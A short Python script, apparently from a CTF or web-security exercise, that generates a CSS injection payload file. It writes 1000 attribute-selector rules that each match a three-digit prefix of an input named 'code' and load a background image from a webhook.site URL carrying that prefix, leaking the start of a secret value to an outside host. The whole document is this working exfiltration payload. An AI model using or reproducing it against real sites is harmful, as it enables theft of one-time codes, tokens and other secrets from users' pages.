number = 0  # start from 000
with open('part3.css', 'w') as f:
    while number < 1000:
        f.write(f'#code[value^="{number:03d}"] {{\n')
        f.write(f'    background: url("https://webhook.site/155e4a8e-ee72-4192-a2ad-e1264a2fe8c1?code={number:03d}");\n')
        f.write('}\n')
        number += 1